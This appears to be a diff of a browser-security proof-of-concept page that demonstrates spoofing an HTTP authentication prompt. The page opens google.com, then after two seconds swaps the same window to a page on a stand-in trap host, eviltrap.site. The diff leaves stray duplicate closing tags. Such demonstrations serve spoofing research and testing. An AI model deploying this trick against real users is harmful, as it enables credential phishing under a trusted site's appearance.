@@ -1,38 +1,41 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    <title>HTTP Auth Prompt</title>
-    <style>
-      html, body {
-        width: 100%;
-        height: 100%;
-        margin: 0;
-        background: #f5f5f5;
-        font-family: sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        cursor: pointer;
-      }
-      h2 {
-        color: #333;
-        text-align: center;
-      }
-    </style>
-  </head>
-  <body>
-    <h2>Tap Anywhere to Start</h2>
-    <script>
-      let alreadyClicked = false;
+<head>
+  <title>HTTP Auth Prompt</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    #fullscreenButton {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent;
+      border: none;
+      font-size: 24px;
+      color: #444;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <button id="fullscreenButton">Tap anywhere to continue</button>
 
-      document.body.addEventListener('click', () => {
-        if (alreadyClicked) return;
-        alreadyClicked = true;
-
-        window.open('https://google.com', 'g');
-        setTimeout(() => {
-          window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
-        }, 2000);
-      });
-    </script>
+  <script>
+    document.getElementById('fullscreenButton').addEventListener('click', () => {
+      window.open('https://google.com', 'g');
+      setTimeout(() => {
+        window.open('https://eviltrap.site/trap/http-auth-prompt-spoof/auth', 'g');
+      }, 2000);
+      // Hide button after first tap
+      document.getElementById('fullscreenButton').style.display = 'none';
+    });
+  </script>
+</body>
+</html>
   </body>
 </html>
